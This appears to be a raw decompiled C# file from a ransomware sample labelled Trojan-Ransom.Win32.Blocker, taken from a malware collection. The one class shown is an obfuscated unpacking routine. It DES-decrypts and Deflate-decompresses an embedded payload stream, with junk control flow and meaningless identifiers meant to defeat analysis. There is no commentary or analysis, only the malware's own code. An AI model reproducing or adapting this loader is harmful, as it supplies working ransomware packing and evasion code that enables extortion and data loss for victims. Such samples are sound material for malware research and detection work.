// Decompiled with JetBrains decompiler
// Type: A.c567979626dfb45d62530799932d71fd4
// Assembly: qfpxK, Version=2.5.4.7, Culture=neutral, PublicKeyToken=null
// MVID: 361ECBAB-70B9-4DF3-85CB-6EE9889776D8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.cavk-847dea3068a77ef664bb3e6a572fbc090428c048080fb7d8d1c6a0541b13ec59.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;

namespace A
{
  internal class c567979626dfb45d62530799932d71fd4
  {
    private static readonly object cba7594d81103c228a55d434c067f58bd;
    private static readonly int c52fbec54a3d7d3564b94f7924108d17e;
    private static readonly int c78d4751c71686e755e86b17d051504c6;
    private static readonly MemoryStream cd25a285a0e2744828015cbebce561971 = (MemoryStream) null;
    private static readonly MemoryStream c22da3c98df3032c45cacc5c492ec323d = (MemoryStream) null;
    private static readonly byte ca441cdf3d5b4a36e69c33c3cf845ec0b;

    static c567979626dfb45d62530799932d71fd4()
    {
      c567979626dfb45d62530799932d71fd4.c52fbec54a3d7d3564b94f7924108d17e = int.MaxValue;
      c567979626dfb45d62530799932d71fd4.c78d4751c71686e755e86b17d051504c6 = int.MinValue;
      c567979626dfb45d62530799932d71fd4.cd25a285a0e2744828015cbebce561971 = ca8694c8444b3b0a9c38ed4833fa45ac7.cc63232ee13ab41e6150822e5b780ae3e(0);
      c567979626dfb45d62530799932d71fd4.c22da3c98df3032c45cacc5c492ec323d = ca8694c8444b3b0a9c38ed4833fa45ac7.cc63232ee13ab41e6150822e5b780ae3e(0);
      c567979626dfb45d62530799932d71fd4.cba7594d81103c228a55d434c067f58bd = cbab06af86d50e0191cfe2da104e42bfe.cc63232ee13ab41e6150822e5b780ae3e();
    }

    private static string caba352886cae43bef870d5dacb6aa649(
      Assembly cda23a2d98418b54f385a2b68d6e684d2)
    {
      string cb671eff18918ae1fc205f0ab36140371_1 = cf4e3bafb71d06ba449eba02be48584a6.c2c997508d3c448e760c427accd624bac((object) cda23a2d98418b54f385a2b68d6e684d2);
      int cb671eff18918ae1fc205f0ab36140371_2 = c92558cff1445331764cfb3051dd49fe4.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_1, ',');
      if (cb671eff18918ae1fc205f0ab36140371_2 >= 0)
      {
label_1:
        switch (3)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (c567979626dfb45d62530799932d71fd4.caba352886cae43bef870d5dacb6aa649);
            }
            cb671eff18918ae1fc205f0ab36140371_1 = c4ed6f90b7ac4a4a93d29610b31338cac.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_1, 0, cb671eff18918ae1fc205f0ab36140371_2);
            break;
        }
      }
      return cb671eff18918ae1fc205f0ab36140371_1;
    }

    private static byte[] c1a5508c2e7e800276ee8a7be21bd6505(
      Assembly cda23a2d98418b54f385a2b68d6e684d2)
    {
      try
      {
        string cb671eff18918ae1fc205f0ab36140371_1 = cf4e3bafb71d06ba449eba02be48584a6.c2c997508d3c448e760c427accd624bac((object) cda23a2d98418b54f385a2b68d6e684d2);
        int num = cd30e729634fcadbafb911f648da20393.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_1, "PublicKeyToken=");
        if (num < 0)
          num = cd30e729634fcadbafb911f648da20393.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_1, "publickeytoken=");
        if (num < 0)
        {
label_3:
          switch (2)
          {
            case 0:
              goto label_3;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (c567979626dfb45d62530799932d71fd4.c1a5508c2e7e800276ee8a7be21bd6505);
              }
              return (byte[]) null;
          }
        }
        else
        {
          int cb671eff18918ae1fc205f0ab36140371_2 = num + 15;
          if (c940ef981054baf41ce4d5d86b6a4d73e.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_1, cb671eff18918ae1fc205f0ab36140371_2) == 'n' || c940ef981054baf41ce4d5d86b6a4d73e.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_1, cb671eff18918ae1fc205f0ab36140371_2) == 'N')
            return (byte[]) null;
          byte[] cb671eff18918ae1fc205f0ab36140371_3 = c623e9786734245867192c0a3838c10c6.cc63232ee13ab41e6150822e5b780ae3e(c44a8a5f266d65ef83a69d5ea958c992b.cc63232ee13ab41e6150822e5b780ae3e(c4ed6f90b7ac4a4a93d29610b31338cac.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_1, cb671eff18918ae1fc205f0ab36140371_2, 16), NumberStyles.HexNumber));
          ceab7432ab12b2ae9dbaf5304824144e6.cc63232ee13ab41e6150822e5b780ae3e((Array) cb671eff18918ae1fc205f0ab36140371_3);
          return cb671eff18918ae1fc205f0ab36140371_3;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] c9f47b3420f62f9b6c9a9cd849a8d86a0(
      Stream c5e1543dc7acb6f817d85013b2baa693b)
    {
      object cba7594d81103c228a55d434c067f58bd;
      cc634779d17c76adb7b9ec354a3175679.cc63232ee13ab41e6150822e5b780ae3e(cba7594d81103c228a55d434c067f58bd = c567979626dfb45d62530799932d71fd4.cba7594d81103c228a55d434c067f58bd);
      try
      {
        return c567979626dfb45d62530799932d71fd4.c44691dec31a71af3534427a128b3dc3e(97L, c5e1543dc7acb6f817d85013b2baa693b);
      }
      finally
      {
        c17fad5ae4c9486a5d234790c834336b8.cc63232ee13ab41e6150822e5b780ae3e(cba7594d81103c228a55d434c067f58bd);
      }
    }

    internal static byte[] c09ae15c1e046265bafc3cd2956d1eaa1(
      long ca441cdf3d5b4a36e69c33c3cf845ec0b,
      Stream c5e1543dc7acb6f817d85013b2baa693b)
    {
      try
      {
        return c567979626dfb45d62530799932d71fd4.c9f47b3420f62f9b6c9a9cd849a8d86a0(c5e1543dc7acb6f817d85013b2baa693b);
      }
      catch (HostProtectionException ex)
      {
        return c567979626dfb45d62530799932d71fd4.c44691dec31a71af3534427a128b3dc3e(97L, c5e1543dc7acb6f817d85013b2baa693b);
      }
    }

    internal static byte[] c44691dec31a71af3534427a128b3dc3e(
      long ca441cdf3d5b4a36e69c33c3cf845ec0b,
      Stream c5e1543dc7acb6f817d85013b2baa693b)
    {
      Stream cb671eff18918ae1fc205f0ab36140371_1 = c5e1543dc7acb6f817d85013b2baa693b;
      MemoryStream cb671eff18918ae1fc205f0ab36140371_2 = (MemoryStream) null;
      ushort num1 = ~(ushort) ce2cc750d98d1be07d6386357011cce83.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b);
      for (int index = 1; index < 3; ++index)
        ce2cc750d98d1be07d6386357011cce83.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b);
      if (((int) num1 & 2) != 0)
      {
label_4:
        switch (1)
        {
          case 0:
            goto label_4;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (c567979626dfb45d62530799932d71fd4.c44691dec31a71af3534427a128b3dc3e);
            }
            DESCryptoServiceProvider cb671eff18918ae1fc205f0ab36140371_3 = c525ee8616651f868a95765e00d0dcea2.cc63232ee13ab41e6150822e5b780ae3e();
            byte[] cb671eff18918ae1fc205f0ab36140371_4 = new byte[8];
            cbaa6a8df9f1fa8d80fcfe1bc164f030f.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b, cb671eff18918ae1fc205f0ab36140371_4, 0, 8);
            cd64031a566e74e59ededc95a09b32885.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_3, cb671eff18918ae1fc205f0ab36140371_4);
            byte[] cb671eff18918ae1fc205f0ab36140371_5 = new byte[8];
            cbaa6a8df9f1fa8d80fcfe1bc164f030f.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b, cb671eff18918ae1fc205f0ab36140371_5, 0, 8);
            bool flag = true;
            foreach (byte num2 in cb671eff18918ae1fc205f0ab36140371_5)
            {
              if (num2 != (byte) 0)
              {
                flag = false;
                goto label_13;
              }
            }
label_12:
            switch (5)
            {
              case 0:
                goto label_12;
            }
label_13:
            if (flag)
            {
label_14:
              switch (2)
              {
                case 0:
                  goto label_14;
                default:
                  cb671eff18918ae1fc205f0ab36140371_5 = c567979626dfb45d62530799932d71fd4.c1a5508c2e7e800276ee8a7be21bd6505(c65f26cc7908f2cd08bd44a640dac5cd5.cc63232ee13ab41e6150822e5b780ae3e());
                  break;
              }
            }
            c98f6f09ce27a250f642bb22417dbc397.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_3, cb671eff18918ae1fc205f0ab36140371_5);
            if (c567979626dfb45d62530799932d71fd4.cd25a285a0e2744828015cbebce561971 == null)
            {
              if (c567979626dfb45d62530799932d71fd4.c52fbec54a3d7d3564b94f7924108d17e == int.MaxValue)
              {
label_18:
                switch (3)
                {
                  case 0:
                    goto label_18;
                  default:
                    c2af7b3452bb0934706d29feda71c62a3.c2c997508d3c448e760c427accd624bac((object) c567979626dfb45d62530799932d71fd4.cd25a285a0e2744828015cbebce561971, (int) ca1cbbeaf334de948e41d2458f721b741.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b));
                    break;
                }
              }
              else
                c2af7b3452bb0934706d29feda71c62a3.c2c997508d3c448e760c427accd624bac((object) c567979626dfb45d62530799932d71fd4.cd25a285a0e2744828015cbebce561971, c567979626dfb45d62530799932d71fd4.c52fbec54a3d7d3564b94f7924108d17e);
            }
            ca57e727f79840ddcd8d9c74115769e6a.c2c997508d3c448e760c427accd624bac((object) c567979626dfb45d62530799932d71fd4.cd25a285a0e2744828015cbebce561971, 0L);
            ICryptoTransform cb671eff18918ae1fc205f0ab36140371_6 = c525c47b65c7c5f107de8af21569d9d10.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_3);
            int cb671eff18918ae1fc205f0ab36140371_7 = cf60b58ed685055d605ef3e197849326d.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_6);
            c70482053cd96d1f657834893a46dc390.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_6);
            byte[] cb671eff18918ae1fc205f0ab36140371_8 = new byte[c70482053cd96d1f657834893a46dc390.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_6)];
            byte[] cb671eff18918ae1fc205f0ab36140371_9 = new byte[cf60b58ed685055d605ef3e197849326d.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_6)];
            int num3;
            for (num3 = (int) ccd08d3cc7ff5231f940afcae66b3a365.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b); (long) (num3 + cb671eff18918ae1fc205f0ab36140371_7) < ca1cbbeaf334de948e41d2458f721b741.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b); num3 += cb671eff18918ae1fc205f0ab36140371_7)
            {
              cbaa6a8df9f1fa8d80fcfe1bc164f030f.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b, cb671eff18918ae1fc205f0ab36140371_9, 0, cb671eff18918ae1fc205f0ab36140371_7);
              int cb671eff18918ae1fc205f0ab36140371_10 = c10943d16592db2b44a702d67da3c5e50.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_6, cb671eff18918ae1fc205f0ab36140371_9, 0, cb671eff18918ae1fc205f0ab36140371_7, cb671eff18918ae1fc205f0ab36140371_8, 0);
              c5eae099328449b92d777b31b78c7274b.c2c997508d3c448e760c427accd624bac((object) c567979626dfb45d62530799932d71fd4.cd25a285a0e2744828015cbebce561971, cb671eff18918ae1fc205f0ab36140371_8, 0, cb671eff18918ae1fc205f0ab36140371_10);
            }
            cbaa6a8df9f1fa8d80fcfe1bc164f030f.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b, cb671eff18918ae1fc205f0ab36140371_9, 0, (int) (ca1cbbeaf334de948e41d2458f721b741.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b) - (long) num3));
            byte[] cb671eff18918ae1fc205f0ab36140371_11 = c3c71042f0b13b19dd7fd48359f4fd5f0.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_6, cb671eff18918ae1fc205f0ab36140371_9, 0, (int) (ca1cbbeaf334de948e41d2458f721b741.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b) - (long) num3));
            c5eae099328449b92d777b31b78c7274b.c2c997508d3c448e760c427accd624bac((object) c567979626dfb45d62530799932d71fd4.cd25a285a0e2744828015cbebce561971, cb671eff18918ae1fc205f0ab36140371_11, 0, cb671eff18918ae1fc205f0ab36140371_11.Length);
            cb671eff18918ae1fc205f0ab36140371_1 = (Stream) c567979626dfb45d62530799932d71fd4.cd25a285a0e2744828015cbebce561971;
            ca57e727f79840ddcd8d9c74115769e6a.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_1, 0L);
            cb671eff18918ae1fc205f0ab36140371_2 = c567979626dfb45d62530799932d71fd4.cd25a285a0e2744828015cbebce561971;
            break;
        }
      }
      if (((int) num1 & 8) != 0)
      {
        try
        {
          if (c567979626dfb45d62530799932d71fd4.c22da3c98df3032c45cacc5c492ec323d == null)
          {
label_27:
            switch (2)
            {
              case 0:
                goto label_27;
              default:
                if (c567979626dfb45d62530799932d71fd4.c78d4751c71686e755e86b17d051504c6 == int.MinValue)
                {
label_29:
                  switch (4)
                  {
                    case 0:
                      goto label_29;
                    default:
                      c2af7b3452bb0934706d29feda71c62a3.c2c997508d3c448e760c427accd624bac((object) c567979626dfb45d62530799932d71fd4.c22da3c98df3032c45cacc5c492ec323d, (int) ca1cbbeaf334de948e41d2458f721b741.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_1) * 2);
                      break;
                  }
                }
                else
                {
                  c2af7b3452bb0934706d29feda71c62a3.c2c997508d3c448e760c427accd624bac((object) c567979626dfb45d62530799932d71fd4.c22da3c98df3032c45cacc5c492ec323d, c567979626dfb45d62530799932d71fd4.c78d4751c71686e755e86b17d051504c6);
                  break;
                }
                break;
            }
          }
          ca57e727f79840ddcd8d9c74115769e6a.c2c997508d3c448e760c427accd624bac((object) c567979626dfb45d62530799932d71fd4.c22da3c98df3032c45cacc5c492ec323d, 0L);
          DeflateStream cb671eff18918ae1fc205f0ab36140371_12 = c4ae09b25e4b58ca821a65ab4ca6e4b7a.cc63232ee13ab41e6150822e5b780ae3e(cb671eff18918ae1fc205f0ab36140371_1, CompressionMode.Decompress);
          int cb671eff18918ae1fc205f0ab36140371_13 = 1000;
          byte[] cb671eff18918ae1fc205f0ab36140371_14 = new byte[cb671eff18918ae1fc205f0ab36140371_13];
          int cb671eff18918ae1fc205f0ab36140371_15;
          do
          {
            cb671eff18918ae1fc205f0ab36140371_15 = cbaa6a8df9f1fa8d80fcfe1bc164f030f.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_12, cb671eff18918ae1fc205f0ab36140371_14, 0, cb671eff18918ae1fc205f0ab36140371_13);
            if (cb671eff18918ae1fc205f0ab36140371_15 > 0)
            {
label_34:
              switch (7)
              {
                case 0:
                  goto label_34;
                default:
                  c5eae099328449b92d777b31b78c7274b.c2c997508d3c448e760c427accd624bac((object) c567979626dfb45d62530799932d71fd4.c22da3c98df3032c45cacc5c492ec323d, cb671eff18918ae1fc205f0ab36140371_14, 0, cb671eff18918ae1fc205f0ab36140371_15);
                  break;
              }
            }
          }
          while (cb671eff18918ae1fc205f0ab36140371_15 >= cb671eff18918ae1fc205f0ab36140371_13);
label_37:
          switch (6)
          {
            case 0:
              goto label_37;
            default:
              cb671eff18918ae1fc205f0ab36140371_2 = c567979626dfb45d62530799932d71fd4.c22da3c98df3032c45cacc5c492ec323d;
              break;
          }
        }
        catch (Exception ex)
        {
        }
      }
      if (cb671eff18918ae1fc205f0ab36140371_2 != null)
      {
label_41:
        switch (1)
        {
          case 0:
            goto label_41;
          default:
            return cddc2f26fd0717b50d07ea0692e04bb6e.c2c997508d3c448e760c427accd624bac((object) cb671eff18918ae1fc205f0ab36140371_2);
        }
      }
      else
      {
        byte[] cb671eff18918ae1fc205f0ab36140371_16 = new byte[ca1cbbeaf334de948e41d2458f721b741.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b) - ccd08d3cc7ff5231f940afcae66b3a365.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b)];
        cbaa6a8df9f1fa8d80fcfe1bc164f030f.c2c997508d3c448e760c427accd624bac((object) c5e1543dc7acb6f817d85013b2baa693b, cb671eff18918ae1fc205f0ab36140371_16, 0, cb671eff18918ae1fc205f0ab36140371_16.Length);
        return cb671eff18918ae1fc205f0ab36140371_16;
      }
    }
  }
}
